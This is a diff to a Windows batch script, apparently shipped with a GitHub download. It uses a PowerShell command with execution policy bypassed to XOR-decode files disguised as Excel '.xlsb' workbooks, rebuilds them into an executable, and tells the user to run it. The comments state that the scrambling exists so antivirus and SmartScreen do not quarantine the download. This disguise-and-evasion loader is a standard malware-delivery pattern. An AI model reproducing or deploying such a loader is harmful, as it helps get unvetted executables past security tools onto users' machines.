@@ -1,7 +1,9 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal
+pushd "%~dp0"
+
 rem ============================================================
-rem Excel Workbook Manager — Beta v12.3 reassembly script
+rem Excel Workbook Manager - Beta v12.3 reassembly script
 rem
 rem Each .part??.xlsb chunk is the corresponding 8 MB slice of
 rem ExcelWorkbookManager.exe with every byte XOR'd against 0xAA.
@@ -9,6 +11,12 @@ rem That keeps the chunks from looking like a Windows executable
 rem on disk so antivirus / SmartScreen don't quarantine the
 rem GitHub download. We undo the XOR here, concatenate, and
 rem verify the SHA-256 of the resulting .exe.
+rem
+rem The PowerShell payload below is a single line (no ^ line
+rem continuations) because cmd.exe handles those inconsistently
+rem on some Windows installs and PowerShell ends up seeing the
+rem ^ characters as literals, which is what was breaking the
+rem previous version of this script.
 rem ============================================================
 
 set "EXPECTED_SHA=114734AAE5EE6FC39110535D7BAC804EFDAA68437CE5D36DEC8C084EE2D16788"
@@ -18,33 +26,21 @@ echo.
 echo Reassembling %OUT% from XOR-scrambled .xlsb chunks...
 echo.
 
-rem Locate every part??.xlsb in numerical order.
-set "PARTS="
-for /f "delims=" %%P in ('dir /b /on "ExcelWorkbookManager.part*.xlsb" 2^>nul') do (
-    if defined PARTS (set "PARTS=!PARTS!,%%P") else (set "PARTS=%%P")
-)
-if not defined PARTS (
-    echo ERROR: No ExcelWorkbookManager.part*.xlsb files found in this folder.
+if exist "%OUT%" del "%OUT%"
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $parts = Get-ChildItem -Filter 'ExcelWorkbookManager.part*.xlsb' | Sort-Object Name; if ($parts.Count -eq 0) { Write-Host 'ERROR: No ExcelWorkbookManager.part*.xlsb chunks found in this folder.'; exit 2 }; $out = [System.IO.File]::OpenWrite((Resolve-Path -LiteralPath '.').Path + '\\%OUT%'); try { foreach ($p in $parts) { $b = [System.IO.File]::ReadAllBytes($p.FullName); for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor 0xAA }; $out.Write($b, 0, $b.Length); Write-Host ('  appended ' + $p.Name + ' (' + $b.Length + ' bytes)') } } finally { $out.Close() }"
+
+if errorlevel 1 (
+    echo.
+    echo ERROR: Reassembly failed.
+    echo Make sure all .part??.xlsb chunks are present in this folder.
     pause
     exit /b 1
 )
 
-if exist "%OUT%" del "%OUT%"
-
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-  "$parts = '%PARTS%'.Split(','); ^
-   $out = [System.IO.File]::OpenWrite('%OUT%'); ^
-   try { ^
-     foreach ($p in $parts) { ^
-       $b = [System.IO.File]::ReadAllBytes($p); ^
-       for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor 0xAA }; ^
-       $out.Write($b, 0, $b.Length); ^
-       Write-Host ('  appended ' + $p + ' (' + $b.Length + ' bytes)') ^
-     } ^
-   } finally { $out.Close() }"
-
 if not exist "%OUT%" (
-    echo ERROR: Reassembly failed.
+    echo.
+    echo ERROR: Reassembly did not produce %OUT%.
     pause
     exit /b 1
 )
@@ -57,10 +53,9 @@ echo   actual  : %ACTUAL%
 
 if /i "%ACTUAL%"=="%EXPECTED_SHA%" (
     echo.
-    echo OK — %OUT% reassembled successfully.
+    echo OK -- %OUT% reassembled successfully.
     echo Place this .exe in your existing ExcelWorkbookManager folder
-    echo (the one that already contains the _internal subfolder) and
-    echo run it.
+    echo - the one that already contains the _internal subfolder - and run it.
 ) else (
     echo.
     echo WARNING: SHA-256 mismatch. The download may be corrupted.
